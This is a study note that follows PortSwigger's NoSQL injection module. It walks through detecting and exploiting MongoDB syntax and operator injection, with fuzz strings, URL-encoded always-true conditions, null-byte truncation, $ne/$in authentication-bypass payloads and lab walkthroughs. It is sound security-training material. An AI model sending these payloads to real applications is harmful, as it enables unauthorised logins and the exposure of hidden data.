---
description: >-
  https://portswigger.net/web-security/learning-paths/nosql-injection/types-of-nosql-injection/nosql-injection/types-of-nosql-injection
---

# 🙅 NoSQL injection

The following content is based 99% on the portswigger academy module, my goal is to take everything relevant in the course but practically all the content was very valuable to fully understand, so a better option would be to directly go on the academy module

**There are two different types of NoSQL injection:**

* Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
* Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

You can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application.

#### Detecting syntax injection in MongoDB

let's say our url for the fuzzy page is:

```
https://insecure-website.com/product/lookup?category=fizzy
```

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

```
this.category == 'fizzy'
```

To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter

In mongoDB it looks like this:

```
'"`{
;$Foo}
$Foo \xYZ
```

* The goal is to evaluate if the application is vulnerable to NoSQL injection by testing the behavior when unusual or malicious input is provided to the "category" parameter.
* **Fuzzing**: Fuzzing involves providing unexpected, random, or malformed data to a system to uncover vulnerabilities.
* **Example String**:
  * `'"`{\`: This part seems to start with single and double quotes followed by an opening curly brace. This combination might be an attempt to break out of a string context or introduce a new object.
  * `;$Foo}`: This part injects a semicolon followed by a variable named "Foo" and a closing curly brace. The injection of variables or commands aims to manipulate the query's logic.
  * `$Foo \xYZ`: This section references the variable "Foo" followed by `\xYZ`, possibly trying to inject a command or exploit a vulnerability using the backslash as an escape character.
* **Execution**: By submitting this example string as the value for the "category" parameter, the tester can observe how the application responds. If the application behaves unexpectedly, such as executing additional commands or producing errors, it indicates potential vulnerability to NoSQL injection.

Use this fuzz string to construct the following attack:

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

#### Determining which characters are processed

To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit `'`, which results in the following MongoDB query:

`this.category == '''`

If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error. You can confirm this by submitting a valid query string in the input, for example by escaping the quote:

`this.category == '\''`

If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

***

To test if we can influance boolean conditions, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements&#x20;

`' && 0 && 'x`&#x20;

and&#x20;

`' && 1 && 'x`&#x20;

as follows:

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

#### Overriding existing conditions

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`:

`https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27`

This results in the following MongoDB query:

`this.category == 'fizzy'||'1'=='1'`

As the injected condition is always true, the modified query returns all items.

You can also add null character, MongoDB may ignore all characters after a null character.

imagine an item has an hidden query that enables us to see it:

```
this.category == 'fizzy' && this.released == 1
```

The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

With a null charachter in our input, we can bypass the hidden&#x20;

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

### Lab: Detecting NoSQL injection

Given this website:

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

adding a null char after the category variables:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

To go further, we hop on cyberchef and URL encode the following payload:

```
Gifts' && 1 && 'x
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>a true condition in</p></figcaption></figure>

and it works:

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Now we are going to encode a boolean condition that always evaluates to true in the category parameter

```
Gifts'||1||'
```

output:

```
Gifts%27%7C%7C1%7C%7C%27
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

#### NoSQL operator injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result.

* `$where` - Matches documents that satisfy a JavaScript expression.
* `$ne` - Matches all values that are not equal to a specified value.
* `$in` - Matches all of the values specified in an array.
* `$regex` - Selects documents where values match a specified regular expression.

In JSON messages:

`{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

In URL-based inputs:

`username=wiener` becomes `username[$ne]=invalid`

If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

#### Detecting operator injection in MongoDB

`{"username":{"$ne":"invalid"},"password":{"peter"}}`

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

### Lab: Exploiting NoSQL operator injection to bypass authentication

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

So we had the credentials' wiener:peter so i was able to test out some fun stuff and realized that wien.\* was a valid regex and i could bypass the password with the $ne option. Let's try for admin:

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

So i can just copy and paste this in burp browser or forward the request:

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

and lab is solved
